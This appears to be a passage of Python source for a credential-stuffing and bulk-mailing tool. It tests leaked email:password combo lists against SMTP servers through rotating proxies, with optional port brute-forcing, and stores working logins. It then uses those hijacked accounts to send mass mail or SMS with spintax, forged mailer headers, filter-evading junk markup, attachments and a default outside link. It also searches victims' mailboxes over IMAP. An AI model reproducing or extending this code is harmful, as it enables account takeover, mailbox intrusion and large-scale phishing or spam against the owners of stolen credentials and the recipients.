    "comcast.net":     [("smtp.comcast.net", 587), ("smtp.comcast.net", 465)],
    "att.net":         [("smtp.mail.att.net", 465)],
    "charter.net":     [("mobile.charter.net", 587)],
    "spectrum.net":    [("mobile.charter.net", 587)],
    "cox.net":         [("smtp.cox.net", 587)],
    "earthlink.net":   [("smtpauth.earthlink.net", 587)],
    "netzero.net":     [("smtp.netzero.net", 587)],
    # Canada
    "bell.net":        [("smtphm.sympatico.ca", 587)],
    "sympatico.ca":    [("smtphm.sympatico.ca", 587)],
    "shaw.ca":         [("mail.shaw.ca", 587)],
    "telus.net":       [("smtp.telus.net", 465)],
    # Other
    "rediffmail.com":  [("smtp.rediffmail.com", 587)],
    "eircom.net":      [("mail.eircom.net", 587)],
    "walla.co.il":     [("out.walla.co.il", 587)],
    "mynet.com":       [("smtp.mynet.com", 465)],
    "bluewin.ch":      [("smtpauths.bluewin.ch", 465)],
    "telenet.be":      [("smtp.telenet.be", 587)],
}

def _smtp_derive_endpoints(user: str, given_host: str = "", given_port: int = 0):
    """
    Build an ordered list of (host, port) endpoints to try for an SMTP login.
    Priority: given host/port > SMTP_ENDPOINT_MAP > SMTP_CONFIGS > custom domain fallback.
    """
    endpoints = []

    # 1. Explicitly provided host:port (highest priority)
    if given_host and given_port:
        endpoints.append((given_host, int(given_port)))
        return endpoints  # Trust the user-supplied value, try it first and only

    if "@" not in user:
        return [("smtp.gmail.com", 587)]

    domain = user.split("@", 1)[1].lower().strip()

    # 2. Exact match in our expanded map
    if domain in SMTP_ENDPOINT_MAP:
        return list(SMTP_ENDPOINT_MAP[domain])

    # 3. Partial match (subdomain or parent domain)
    for key, val in SMTP_ENDPOINT_MAP.items():
        if domain.endswith("." + key) or key.endswith("." + domain):
            return list(val)

    # 4. SMTP_CONFIGS dict (existing code)
    cfg = get_email_config(user)
    if cfg:
        for srv_host, srv_port, _ in cfg.get("servers", []):
            if (srv_host, srv_port) not in endpoints:
                endpoints.append((srv_host, srv_port))
    if endpoints:
        return endpoints

    # 5. .edu / .gov → Office365
    if domain.endswith(".edu") or domain.endswith(".gov"):
        return [("smtp.office365.com", 587)]

    # 6. Generic custom domain fallback: smtp.domain:587/465, mail.domain:587
    return [
        ("smtp." + domain, 587),
        ("smtp." + domain, 465),
        ("mail." + domain, 587),
        (domain, 587),
    ]


def smtp_scan_worker(combo: str):
    """SMTP scanner — ported from aiofinal check_smtp with full custom-domain support."""
    if state.stop_requested:
        return
    try:
        combo = combo.strip()
        if not combo:
            return

        # ── Parse combo ──────────────────────────────────────────────────────
        sep = "|" if "|" in combo else ":"
        parts = [p.strip() for p in combo.split(sep)]

        given_host, given_port, user, pwd = "", 0, "", ""

        if len(parts) >= 4 and parts[1].isdigit() and "@" in parts[2]:
            # host|port|user|pass
            given_host, given_port, user, pwd = parts[0], int(parts[1]), parts[2], parts[3]
        elif len(parts) >= 3 and "@" in parts[1]:
            # host|user|pass
            given_host, user, pwd = parts[0], parts[1], parts[2]
        elif len(parts) == 2 and "@" in parts[0]:
            # user|pass
            user, pwd = parts[0], parts[1]
        else:
            with state.lock:
                state.smtp_bad += 1
            return

        if not user or not pwd:
            with state.lock:
                state.smtp_bad += 1
            return

        # ── Build endpoint list ───────────────────────────────────────────────
        endpoints = _smtp_derive_endpoints(user, given_host, given_port)

        cat = "Generic"
        limit = 500
        cfg = get_email_config(user)
        if cfg:
            cat = str(cfg.get("type", "Generic"))
            limit = int(cfg.get("limit", 500))

        success = False
        last_err = "No endpoints"
        final_host, final_port = "", 0

        # Pick a random proxy for this attempt
        proxy_cfg = random.choice(state.parsed_proxies) if state.parsed_proxies else None

        # ── Try each endpoint ─────────────────────────────────────────────────
        for hst, prt in endpoints:
            if state.stop_requested:
                break
            try:
                # Pre-check TCP reachability only when NOT using a proxy
                # (proxy handles its own routing; local TCP check would fail)
                if not proxy_cfg and not _smtp_test_connection(hst, prt, timeout=5):
                    last_err = f"Port {prt} unreachable on {hst}"
                    continue

                if prt == 465:
                    # SSL direct
                    if proxy_cfg:
                        s = ProxySMTP_SSL(hst, prt, context=ctx, timeout=12, proxy_config=proxy_cfg)
                    else:
                        s = smtplib.SMTP_SSL(hst, prt, context=ctx, timeout=12)
                    s.ehlo(hst)
                    s.login(user, pwd)
                else:
                    # STARTTLS (587 or any other port)
                    if proxy_cfg:
                        s = ProxySMTP(hst, prt, timeout=12, proxy_config=proxy_cfg)
                    else:
                        s = smtplib.SMTP(hst, prt, timeout=12)
                    s.ehlo(hst)
                    try:
                        s.starttls(context=ctx)
                        s.ehlo(hst)
                    except smtplib.SMTPNotSupportedError:
                        pass  # server doesn't support STARTTLS; continue plain
                    s.login(user, pwd)

                s.quit()
                success = True
                final_host, final_port = hst, prt
                break

            except smtplib.SMTPAuthenticationError as e:
                # Auth error = credentials wrong, no point trying more ports
                last_err = f"AuthFail({prt}): {str(e)[:50]}"
                # Save auth failures separately
                try:
                    prov_dir = os.path.join(str(state.session_dir or "."), "SMTP_AuthFail")
                    os.makedirs(prov_dir, exist_ok=True)
                    with open(os.path.join(prov_dir, "auth_fail.txt"), "a") as af:
                        af.write(f"{given_host or hst}|{prt}|{user}|{pwd}\n")
                except:
                    pass
                break  # no point trying other ports with same credentials
            except Exception as e:
                last_err = str(e)[:60]
                continue

        # ── Brute port scan (if enabled and primary failed) ───────────────────
        if not success and state.smtp_brute:
            for hst, _ in endpoints:
                if success:
                    break
                for port in [587, 465, 25, 2525]:
                    if state.stop_requested:
                        break
                    try:
                        if not proxy_cfg and not _smtp_test_connection(hst, port, timeout=4):
                            continue
                        if port == 465:
                            if proxy_cfg:
                                s = ProxySMTP_SSL(hst, port, context=ctx, timeout=10, proxy_config=proxy_cfg)
                            else:
                                s = smtplib.SMTP_SSL(hst, port, context=ctx, timeout=10)
                            s.ehlo(hst)
                        else:
                            if proxy_cfg:
                                s = ProxySMTP(hst, port, timeout=10, proxy_config=proxy_cfg)
                            else:
                                s = smtplib.SMTP(hst, port, timeout=10)
                            s.ehlo(hst)
                            try:
                                s.starttls(context=ctx)
                                s.ehlo(hst)
                            except smtplib.SMTPNotSupportedError:
                                pass
                        s.login(user, pwd)
                        s.quit()
                        success = True
                        final_host, final_port = hst, port
                        break
                    except smtplib.SMTPAuthenticationError:
                        break  # credentials wrong, stop brute on this host
                    except:
                        continue

        # ── Record result ─────────────────────────────────────────────────────
        if success:
            with state.lock:
                state.smtp_live += 1
                hit: Dict[str, Any] = {
                    "host": str(final_host), "port": int(final_port),
                    "user": str(user), "pass": str(pwd),
                    "cat": str(cat), "limit": int(limit)
                }
                state.smtp_results.append(hit)
                prov_dir = os.path.join(str(state.session_dir or "."), "SMTP_Live", str(cat))
                os.makedirs(prov_dir, exist_ok=True)
                with open(os.path.join(prov_dir, f"{cat}.txt"), "a") as f:
                    f.write(f"{final_host}:{final_port}:{user}:{pwd}\n")
                state.smtp_log.append(f"LIVE ✔ {final_host}:{final_port} → {user}")
        else:
            with state.lock:
                state.smtp_bad += 1
                state.smtp_log.append(f"BAD: {user} ({last_err})")

    except Exception as e:
        with state.lock:
            state.smtp_bad += 1
            state.smtp_log.append(f"ERROR: {combo[:40]} ({str(e)[:30]})")
    finally:
        with state.lock:
            state.smtp_checked += 1



def discover_smtp_worker(combo: str, results: List[str]):
    try:
        user, pwd = combo.strip().split(':', 1)
        sh, sp = discover_smtp(user.split('@')[-1])
        with state.lock: results.append(f"{sh}:{sp}:{user}:{pwd}")
    except: pass

@app.get("/api/smtp/hits")
def api_smtp_hits(): return state.smtp_results

@app.post("/api/smtp/start")
async def api_smtp_start(req: Request, bt: BackgroundTasks):
    d = await req.json(); combos = d.get('combos', []); threads = int(d.get('threads', 50))
    state.smtp_combos = [str(c).strip() for c in combos if (':' in str(c) or '|' in str(c))]
    state.smtp_running = True; state.stop_requested = False; state.smtp_brute = d.get('brute', False)
    raw_proxies = d.get('proxies', [])
    if isinstance(raw_proxies, str):
        raw_proxies = [l.strip() for l in raw_proxies.splitlines() if l.strip()]
    elif isinstance(raw_proxies, list):
        raw_proxies = [str(x).strip() for x in raw_proxies if x]
    state.proxies = raw_proxies
    state.parsed_proxies = [p for p in (parse_proxy_string(px) for px in state.proxies) if p]
    state.smtp_checked = 0; state.smtp_live = 0; state.smtp_bad = 0; state.smtp_results = []
    state.smtp_log = ["SMTP ENGINE STARTED..."]
    state.start_time = time.time()
    
    def run_smtp_check():
        if state.smtp_combos:
            with ThreadPoolExecutor(max_workers=threads) as ex:
                for combo in state.smtp_combos:
                    if state.stop_requested: break
                    ex.submit(smtp_scan_worker, combo) # pyre-ignore[7f6b9983-11f3-4b4b-aa72-570675055665]
        state.smtp_running = False
        
    bt.add_task(run_smtp_check)
    return {"ok": True}

@app.post("/api/smtp/extract")
async def api_smtp_extract(req: Request):
    d = await req.json(); combos = d.get('combos', []); res = []
    
    def _ext(c: str):
        try:
            line = c.strip()
            if ':' not in line: return
            user, pwd = line.split(':', 1)
            sh, sp = discover_smtp(user.split('@')[-1])
            with state.lock: res.append(f"{sh}:{sp}:{user}:{pwd}")
        except: pass

    with ThreadPoolExecutor(max_workers=50) as ex:
        for c in combos:
            if state.stop_requested: break
            ex.submit(_ext, c) # pyre-ignore[845b5ae0-bec2-4c9e-a9b8-d5cabf5d6d5f]
    return {"ok": True, "results": res}

@app.post("/api/smtp/extract/file")
async def api_smtp_extract_file(req: Request, bt: BackgroundTasks):
    d = await req.json(); path = d.get('path'); threads = int(d.get('threads', 200))
    if not os.path.exists(path): return {"error": "File not found"}
    
    state.smtp_running = True; state.stop_requested = False; state.is_extracting = True
    state.smtp_checked = 0; state.smtp_live = 0 # Re-using as progress
    
    def process_large_file():
        try:
            out_path = os.path.join(HITS_FOLDER, f"Extracted_SMTPs_{int(time.time())}.txt")
            with open(path, 'r', encoding='latin-1', errors='ignore') as f, open(out_path, 'a', encoding='utf-8') as out:
                def _extract_one(line: str):
                    if state.stop_requested: return
                    try:
                        line = line.strip()
                        if ':' not in line: return
                        user, pwd = line.split(':', 1)
                        sh, sp = discover_smtp(user.split('@')[-1])
                        out.write(f"{sh}:{sp}:{user}:{pwd}\n")
                        with state.lock: state.smtp_checked += 1
                    except: pass
    
                with ThreadPoolExecutor(max_workers=threads) as ex:
                    # We process in batches to avoid overwhelming the executor queue for 10GB files
                    batch = []
                    for line in f:
                        if state.stop_requested: break
                        batch.append(line)
                        if len(batch) >= 5000:
                            list(ex.map(_extract_one, batch))
                            batch = []
                    if batch: list(ex.map(_extract_one, batch))
        finally:
            state.smtp_running = False
            state.is_extracting = False

    bt.add_task(process_large_file)
    return {"ok": True}

try:
    import socks as _socks_mod
except ImportError:
    _socks_mod = None

# Re-export as 'socks' for the rest of the code
socks = _socks_mod

# ============================================================
# UNIVERSAL PROXY PARSER  — supports ALL types and ALL formats
# ============================================================
# Supported input formats:
#   socks5://host:port
#   socks5h://host:port               (remote DNS)
#   socks4://host:port
#   socks4a://host:port               (remote DNS)
#   http://host:port
#   https://host:port
#   host:port                         (bare — defaults to SOCKS5)
#   ip:port                           (bare — defaults to SOCKS5)
#   host:port:user:pass               (colon-separated with credentials)
#   user:pass@host:port               (URL-style credentials, no scheme)
#   socks5://user:pass@host:port      (full URI with credentials)
#   http://user:pass@host:port        (HTTP with credentials)
# ============================================================

def parse_proxy_string(proxy_str: str) -> dict:
    """Parse any proxy string format into a unified proxy config dict.
    Returns None if the string cannot be parsed."""
    if not proxy_str:
        return None
    proxy_str = proxy_str.strip()
    if not proxy_str or proxy_str.startswith('#'):
        return None

    if socks is None:
        return None  # PySocks not installed

    # --- 1. Detect and strip scheme ---
    p_type = socks.PROXY_TYPE_HTTP   # default to HTTP (most residential proxies)
    remote_dns = False
    lower = proxy_str.lower()

    scheme_map = [
        ("socks5h://",  socks.PROXY_TYPE_SOCKS5, True),
        ("socks5://",   socks.PROXY_TYPE_SOCKS5, False),
        ("socks4a://",  socks.PROXY_TYPE_SOCKS4, True),
        ("socks4://",   socks.PROXY_TYPE_SOCKS4, False),
        ("https://",    socks.PROXY_TYPE_HTTP,   False),
        ("http://",     socks.PROXY_TYPE_HTTP,   False),
    ]
    has_scheme = False
    for scheme, ptype, rdns in scheme_map:
        if lower.startswith(scheme):
            p_type = ptype
            remote_dns = rdns
            proxy_str = proxy_str[len(scheme):]   # strip scheme
            has_scheme = True
            break

    # --- 2. Extract user:pass from URL-style  user:pass@host:port ---
    username = None
    password = None
    if '@' in proxy_str:
        # Everything before the LAST '@' is credentials
        cred_part, proxy_str = proxy_str.rsplit('@', 1)
        if ':' in cred_part:
            username, password = cred_part.split(':', 1)
        else:
            username = cred_part   # password-less (unusual)

    # --- 3. Split host / port (and optional inline creds for bare format) ---
    parts = proxy_str.split(':')

    if len(parts) == 1:
        # Only host, no port — use protocol defaults
        host = parts[0]
        port = 1080 if p_type != socks.PROXY_TYPE_HTTP else 8080

    elif len(parts) == 2:
        # Standard  host:port
        host = parts[0]
        try:
            port = int(parts[1])
        except ValueError:
            return None

    elif len(parts) == 4 and not has_scheme:
        # Bare format  host:port:user:pass  (no scheme was given)
        host = parts[0]
        try:
            port = int(parts[1])
        except ValueError:
            return None
        if username is None:   # don't overwrite URL-style creds
            username = parts[2]
            password = parts[3]

    elif len(parts) == 3 and not has_scheme:
        # Could be  host:port:user  (password-less) or  user:pass:host  (some generators)
        # Heuristic: if parts[1] is a valid port number → host:port:user
        try:
            port = int(parts[1])
            host = parts[0]
            if username is None:
                username = parts[2]
        except ValueError:
            # parts[1] is not a port → try  user:pass:host  without port
            try:
                port = int(parts[2])
                host = parts[2]   # wrong — fall back
                return None
            except ValueError:
                return None
    else:
        # IPv6 or unexpected — best-effort: last segment is port
        try:
            port = int(parts[-1])
            host = ':'.join(parts[:-1])
        except ValueError:
            return None

    # --- 4. Validate ---
    if not host:
        return None
    if not (0 < port < 65536):
        return None

    return {
        'type':       p_type,
        'host':       host.strip(),
        'port':       port,
        'username':   username.strip() if username else None,
        'password':   password.strip() if password else None,
        'remote_dns': remote_dns,
    }


def _proxy_socket(proxy_cfg: dict, target_host: str, target_port: int,
                  timeout: int = 15) -> 'socks.socksocket':
    """Return a connected socks.socksocket routed through proxy_cfg."""
    s = socks.socksocket()
    s.settimeout(timeout)
    s.set_proxy(
        proxy_cfg['type'],
        proxy_cfg['host'],
        proxy_cfg['port'],
        rdns=proxy_cfg.get('remote_dns', False),
        username=proxy_cfg.get('username'),
        password=proxy_cfg.get('password'),
    )
    s.connect((target_host, target_port))
    return s


# ── Proxy-aware SMTP (plain STARTTLS) ─────────────────────────────────────
class ProxySMTP(smtplib.SMTP):
    """smtplib.SMTP that tunnels through any proxy supported by PySocks."""
    def __init__(self, host='', port=0, local_hostname=None,
                 timeout=socket._GLOBAL_DEFAULT_TIMEOUT,
                 source_address=None, proxy_config=None):
        self.proxy_config = proxy_config
        super().__init__(host, port, local_hostname, timeout, source_address)

    def _get_socket(self, host, port, timeout):
        if self.proxy_config:
            t = timeout if (timeout and timeout is not socket._GLOBAL_DEFAULT_TIMEOUT) else 15
            return _proxy_socket(self.proxy_config, host, port, t)
        return super()._get_socket(host, port, timeout)


# ── Proxy-aware SMTP_SSL ──────────────────────────────────────────────────
class ProxySMTP_SSL(smtplib.SMTP_SSL):
    """smtplib.SMTP_SSL that tunnels through any proxy supported by PySocks."""
    def __init__(self, host='', port=0, local_hostname=None,
                 keyfile=None, certfile=None,
                 timeout=socket._GLOBAL_DEFAULT_TIMEOUT,
                 source_address=None, context=None, proxy_config=None):
        self.proxy_config = proxy_config
        super().__init__(host, port, local_hostname, keyfile, certfile,
                         timeout, source_address, context)

    def _get_socket(self, host, port, timeout):
        if self.proxy_config:
            t = timeout if (timeout and timeout is not socket._GLOBAL_DEFAULT_TIMEOUT) else 15
            raw = _proxy_socket(self.proxy_config, host, port, t)
            return self.context.wrap_socket(raw, server_hostname=host)
        return super()._get_socket(host, port, timeout)


# ── Proxy-aware IMAP4 (plain / STARTTLS) ─────────────────────────────────
class ProxyIMAP(imaplib.IMAP4):
    """imaplib.IMAP4 that connects through a SOCKS/HTTP proxy."""
    def __init__(self, host, port=143, timeout=15, proxy_config=None):
        self._proxy_config = proxy_config
        self._proxy_timeout = timeout
        super().__init__(host, port)

    def open(self, host='', port=143, timeout=None):
        t = timeout or self._proxy_timeout or 15
        if self._proxy_config:
            self.sock = _proxy_socket(self._proxy_config, host, port, t)
        else:
            self.sock = socket.create_connection((host, port), t)
        self.file = self.sock.makefile('rb')


# ── Proxy-aware IMAP4_SSL ─────────────────────────────────────────────────
class ProxyIMAP_SSL(imaplib.IMAP4_SSL):
    """imaplib.IMAP4_SSL that connects through a SOCKS/HTTP proxy."""
    def __init__(self, host, port=993, keyfile=None, certfile=None,
                 ssl_context=None, timeout=15, proxy_config=None):
        self._proxy_config = proxy_config
        self._proxy_timeout = timeout
        self.keyfile   = keyfile
        self.certfile  = certfile
        self.ssl_context = ssl_context or ctx
        imaplib.IMAP4.__init__(self, host, port)

    def open(self, host='', port=993, timeout=None):
        t = timeout or self._proxy_timeout or 15
        if self._proxy_config:
            raw = _proxy_socket(self._proxy_config, host, port, t)
        else:
            raw = socket.create_connection((host, port), t)
        self.sock = self.ssl_context.wrap_socket(raw, server_hostname=host)
        self.file = self.sock.makefile('rb')


# ── Proxy-aware POP3_SSL ──────────────────────────────────────────────────
class ProxyPOP3_SSL(poplib.POP3_SSL):
    """poplib.POP3_SSL that connects through a SOCKS/HTTP proxy."""
    def __init__(self, host, port=995, keyfile=None, certfile=None,
                 timeout=15, context=None, proxy_config=None):
        self.host = host
        self.port = port
        self.keyfile  = keyfile
        self.certfile = certfile
        self._timeout = timeout
        self._proxy_config = proxy_config
        ssl_ctx = context or ctx
        if proxy_config:
            raw = _proxy_socket(proxy_config, host, port, timeout)
            self.sock = ssl_ctx.wrap_socket(raw, server_hostname=host)
        else:
            raw = socket.create_connection((host, port), timeout)
            self.sock = ssl_ctx.wrap_socket(raw, server_hostname=host)
        self.file = self.sock.makefile('rb')
        self._debugging = 0
        self.welcome = self._getresp()

@app.post("/api/sender/start")
async def api_sender_start(req: Request, bt: BackgroundTasks):
    d = await req.json()
    mode = d.get('mode', 'SMTP')
    smtps = d.get('smtps', [])
    raw_targets = d.get('targets', [])
    raw_companies = d.get('companies', [])
    raw_proxies = d.get('proxies', '')
    
    target_pairs = parse_email_company_pairs(raw_targets, raw_companies)
    repeat_count = max(1, int(d.get('repeat_count', 1) or 1))
    
    proxies_list = [p.strip() for p in str(raw_proxies).splitlines() if p.strip()]
    parsed_proxies = []
    for p in proxies_list:
        parsed = parse_proxy_string(p)
        if parsed:
            parsed_proxies.append(parsed)
            
    expanded_target_pairs = []
    for idx, item in enumerate(target_pairs):
        for _ in range(repeat_count):
            expanded_target_pairs.append({
                "email": item.get("email", ""),
                "company": item.get("company", ""),
                "subject": item.get("subject", ""),
                "original_idx": idx
            })
    
    subj = d.get('subject', '').strip()
    if not subj:
        subj = "{company}"
    subjects_list = [s.strip() for s in str(subj).splitlines() if s.strip()]
    
    body = d.get('body', '').strip()
    if not body:
        body = "{company} – Please check: https://jpqmall.net/"
    test_mail = d.get('test_mail', '')
    att_name = d.get('att_name', ''); att_data = d.get('att_data', '') # Base64
    delay = float(d.get('delay', 0.1))
    threads = int(d.get('threads', 30))
    max_retries = int(d.get('max_retries', 0))
    sender_name_template = str(d.get('sender_name', '{John|Sarah} {Smith|Jones}'))
    mobile_ip = d.get('mobile_ip', ''); mobile_port = d.get('mobile_port', '8080'); mobile_key = d.get('mobile_key', '')
    
    state.sender_running = True; state.stop_requested = False
    state.sent_count = 0; state.failed_count = 0; state.inbox_count = 0; state.spam_count = 0
    state.sender_log = []

    def parse_spintax(text: str) -> str:
        while True:
            match = re.search(r'{([^{}]+)}', text)
            if not match: break
            options = match.group(1).split('|')
            text = text[:match.start()] + random.choice(options) + text[match.end():]
        return text

    def run_sender():
        if mode == "SMTP" and (not smtps or not expanded_target_pairs): state.sender_running = False; return
        if mode == "MOBILE" and not expanded_target_pairs: state.sender_running = False; return
        
        smtp_pool = list(dict.fromkeys(smtps))  # remove duplicate SMTP entries while preserving order
        pool_lock = threading.Lock()
        continue_on_success = d.get('continue_on_success', False)
        with state.lock: state.sender_log.append(f"ENGINE: Initializing {mode} mode with {len(target_pairs)} Target(s) x {repeat_count} Copies = {len(expanded_target_pairs)} Total Mails...")
        
        def process_target(target_item: Union[dict, str]):
            if state.stop_requested: return
            
            if isinstance(target_item, dict):
                target = target_item.get("email", "")
                company = target_item.get("company", "")
                inline_subj = target_item.get("subject", "")
                original_idx = target_item.get("original_idx", 0)
            else:
                target = str(target_item)
                company = ""
                inline_subj = ""
                original_idx = 0

            if not target: return
            
            if mode == "MOBILE":
                try:
                    url = f"http://{mobile_ip}:{mobile_port}/send"
                    msg_text = replace_dynamic_tags(parse_spintax(body), target, company)
                    params = {"number": target, "message": msg_text}
                    if mobile_key: params["key"] = mobile_key
                    
                    r = requests.get(url, params=params, timeout=15)
                    if r.status_code == 200:
                        with state.lock: state.sender_log.append(f"MOBILE: SUCCESS -> {target}")
                        state.sent_count += 1
                    else:
                        with state.lock: state.sender_log.append(f"MOBILE: ERROR {r.status_code} for {target}")
                        state.failed_count += 1
                except Exception as e:
                    with state.lock: state.sender_log.append(f"MOBILE: EXCEPTION {e} for {target}")
                    state.failed_count += 1
                return

            sent_successfully = False
            last_smtp_err = "Waiting for SMTP..."
            
            for _ in range(int(max_retries) or len(smtps)): 
                if state.stop_requested: break
                
                smtp_str = ""
                with pool_lock:
                    if not smtp_pool:
                        last_smtp_err = "No SMTPs in pool"
                        break
                    smtp_str = smtp_pool.pop(0)
                    smtp_pool.append(smtp_str)
                
                try:
                    if '|' in smtp_str: parts = smtp_str.split('|', 3)
                    else: parts = smtp_str.split(':', 3)
                    
                    given_host, given_port, user, pwd = "", 0, "", ""
                    if len(parts) >= 4 and parts[1].isdigit() and "@" in parts[2]:
                        given_host, given_port, user, pwd = parts[0], int(parts[1]), parts[2], parts[3]
                    elif len(parts) >= 3 and "@" in parts[1]:
                        given_host, user, pwd = parts[0], parts[1], parts[2]
                    elif len(parts) == 2:
                        user, pwd = parts[0], parts[1]
                    else:
                        with state.lock: state.sender_log.append(f"SKIP: Bad format: {smtp_str[:30]}")
                        continue
                    
                    endpoints = _smtp_derive_endpoints(user, given_host, given_port)
                    if not endpoints:
                        with state.lock: state.sender_log.append(f"SKIP: No endpoints resolved for {user}")
                        continue
                        
                    msg = MIMEMultipart('alternative')
                    display_name = parse_spintax(replace_dynamic_tags(sender_name_template, target, company))
                    
                    # 1:1 Subject mapping per target
                    if inline_subj:
                        current_subj_template = inline_subj
                    elif subjects_list:
                        if original_idx < len(subjects_list):
                            current_subj_template = subjects_list[original_idx]
                        else:
                            current_subj_template = subjects_list[-1]
                    else:
                        current_subj_template = ""
                        
                    parsed_subj = parse_spintax(replace_dynamic_tags(current_subj_template, target, company))
                    parsed_body = parse_spintax(replace_dynamic_tags(body, target, company))
                    
                    try:
                        encoded_name = display_name.encode('ascii')
                        safe_name = display_name
                    except UnicodeEncodeError:
                        safe_name = Header(display_name, 'utf-8').encode()
                        
                    msg['From'] = user if not display_name else formataddr((safe_name, user))
                    msg['To'] = target
                    msg['Reply-To'] = user
                    msg['Sender'] = user
                    msg['Return-Path'] = user
                    msg['Subject'] = format_header_subject(parsed_subj)
                    msg['Date'] = formatdate(localtime=True)
                    msg['Message-ID'] = make_msgid(domain=user.split('@')[-1])
                    msg['X-Mailer'] = random.choice([
                        "Microsoft Outlook 16.0", 
                        "Outlook for iOS 2.0", 
                        "Apple Mail 15.0",
                        "Mozilla Thunderbird 115.0"
                    ])
                    msg['X-Priority'] = '3'
                    msg['MIME-Version'] = '1.0'
                    msg['Thread-Index'] = randstr(22)
                    
                    clean_body = parsed_body
                    if '<' in parsed_body and '>' in parsed_body:
                        junk = f'<!--TX:{randstr(16)}-->'
                        clean_body = prepare_html_for_email(parsed_body)
                        clean_body = clean_body.replace('</body>', f'{junk}</body>') if '</body>' in clean_body else f"{clean_body}{junk}"
                    
                    txt_part = MIMEText(html_to_plain(parsed_body), 'plain', 'utf-8')
                    html_part = MIMEText(clean_body, 'html', 'utf-8')
                    txt_part.set_charset('utf-8'); html_part.set_charset('utf-8')
                    msg.attach(txt_part); msg.attach(html_part)
    
                    if att_name and att_data:
                        import base64
                        try:
                            att_msg = MIMEMultipart('mixed')
                            att_msg['From'] = msg['From']; att_msg['To'] = msg['To']; att_msg['Subject'] = msg['Subject']
                            att_msg['Date'] = msg['Date']; att_msg['Message-ID'] = msg['Message-ID']; att_msg['X-Mailer'] = msg['X-Mailer']
                            att_msg.attach(msg)
                            part = MIMEBase('application', "octet-stream")
                            part.set_payload(base64.b64decode(att_data))
                            encoders.encode_base64(part)
                            part.add_header('Content-Disposition', f'attachment; filename="{att_name}"')
                            att_msg.attach(part)
                            msg = att_msg
                        except: pass
                    
                    proxy_config = None
                    if parsed_proxies:
                        proxy_config = random.choice(parsed_proxies)
                        
                    _421_max_retries = 3
                    for _421_attempt in range(_421_max_retries):
                        for sh, sp in endpoints:
                            try:
                                if not proxy_config and not _smtp_test_connection(sh, sp, timeout=5):
                                    continue
                                if sp == 465:
                                    if proxy_config:
                                        s_conn = ProxySMTP_SSL(sh, sp, timeout=15, context=ctx, proxy_config=proxy_config)
                                    else:
                                        s_conn = smtplib.SMTP_SSL(sh, sp, timeout=15, context=ctx)
                                    with s_conn as s:
                                        s.ehlo(sh)
                                        s.login(user, pwd)
                                        result = s.sendmail(user, [target], msg.as_string())
                                        if result:
                                            with state.lock: state.sender_log.append(f"SMTP SEND FAIL ({sh}): {result}")
                                            raise smtplib.SMTPException(f"Recipient refused: {result}")
                                        time.sleep(0.3)
                                        sent_successfully = True
                                else:
                                    if proxy_config:
                                        s_conn = ProxySMTP(sh, sp, timeout=15, proxy_config=proxy_config)
                                    else:
                                        s_conn = smtplib.SMTP(sh, sp, timeout=15)
                                    with s_conn as s:
                                        s.ehlo(sh)
                                        try:
                                            s.starttls(context=ctx)
                                            s.ehlo(sh)
                                        except: pass
                                        s.login(user, pwd)
                                        result = s.sendmail(user, [target], msg.as_string())
                                        if result:
                                            with state.lock: state.sender_log.append(f"SMTP SEND FAIL ({sh}): {result}")
                                            raise smtplib.SMTPException(f"Recipient refused: {result}")
                                        time.sleep(0.3)
                                        sent_successfully = True
                                if sent_successfully:
                                    break
                            except smtplib.SMTPException as smtpe:
                                err_code = getattr(smtpe, 'smtp_code', 0) or (smtpe.args[0] if smtpe.args and isinstance(smtpe.args[0], int) else 0)
                                err_str = str(smtpe)
                                last_smtp_err = err_str[:60]
                                if (err_code == 421 or '421' in err_str) and _421_attempt < _421_max_retries - 1:
                                    backoff = 10 * (_421_attempt + 1)
                                    with state.lock: state.sender_log.append(f"SMTP 421 ({sh}): Deferred, retrying in {backoff}s...")
                                    time.sleep(backoff)
                                    break # retry loop will run next iteration
                                else:
                                    with state.lock: state.sender_log.append(f"SMTP ERR ({sh}): {last_smtp_err}...")
                            except Exception as e:
                                last_smtp_err = str(e)[:60]
                                with state.lock: state.sender_log.append(f"CONN ERR ({sh}): {last_smtp_err}...")
                        if sent_successfully:
                            break
                    if not sent_successfully:
                        continue  # Try next SMTP in pool


                    if sent_successfully:
                        with state.lock:
                            state.sent_count += 1
                            comp_info = f" [{company}]" if company else ""
                            proxy_info = f" (via proxy {proxy_config['host']}:{proxy_config['port']})" if proxy_config else ""
                            state.sender_log.append(f"{target}{comp_info}{proxy_info} -------> SMTP ACCEPTED via {sh}")
                            if target.lower() == test_mail.lower():
                                state.sender_log.append(f"TEST MAIL: SMTP accepted for {test_mail} (check Inbox/Spam, delivery is filter-dependent)")
                        if not continue_on_success:
                            break  # One successful send per target
                except:
                    continue

                if delay > 0: time.sleep(delay)

            if not sent_successfully and not state.stop_requested:
                with state.lock:
                    state.failed_count += 1
                    comp_info = f" [{company}]" if company else ""
                    state.sender_log.append(f"{target}{comp_info} -------> FAILED ({last_smtp_err})")
            time.sleep(0.1) # Small delay to avoid rate limit
        
        with ThreadPoolExecutor(max_workers=threads) as executor:
            for item in expanded_target_pairs:
                if state.stop_requested: break
                executor.submit(process_target, item)
        state.sender_running = False

    bt.add_task(run_sender)
    return {"ok": True}

@app.get("/api/utils/browse-file")
async def api_browse_file():
    import tkinter as tk
    from tkinter import filedialog
    import concurrent.futures
    
    def _open_dialog() -> str:
        root = tk.Tk()
        root.withdraw()
        root.attributes("-topmost", True)
        path = ""
        try:
            path = filedialog.askopenfilename()
        except:
            pass
        root.destroy()
        return str(path)

    with concurrent.futures.ThreadPoolExecutor() as pool:
        path = await asyncio.get_event_loop().run_in_executor(pool, _open_dialog) # type: ignore
    
    return {"path": path}

@app.post("/api/search/global/start")
async def api_search_global_start(req: Request, bt: BackgroundTasks):
    d = await req.json(); keyword = d.get('keyword', '').strip()
    if not keyword: return {"error": "Keyword required"}
    
    state.search_running = True; state.stop_requested = False
    state.search_results = []; state.search_count = 0; state.search_hits = 0
    
    if os.path.exists(VALID_PATH):
        try:
            with open(VALID_PATH, 'r', encoding='utf-8') as f:
                hits = [l.split(' | ')[0].strip() for l in f if ':' in l]
        except: pass
    
    # Track the total number for UI reference
    with state.lock: state.disc_total = len(hits) 

    def run_global_search():
        def _search_one(hit):
            if state.stop_requested: return
            try:
                user, pwd = get_user_pass(hit)
                if not user: return
                ih, ip, _, _, _, _ = discover_server(user.split('@')[-1])
                try:
                    imap_conn: Union[imaplib.IMAP4_SSL, imaplib.IMAP4]
                    if ip == 993: imap_conn = imaplib.IMAP4_SSL(ih, ip, timeout=10, ssl_context=ctx)
                    else:
                        imap_conn = imaplib.IMAP4(ih, ip, timeout=10)
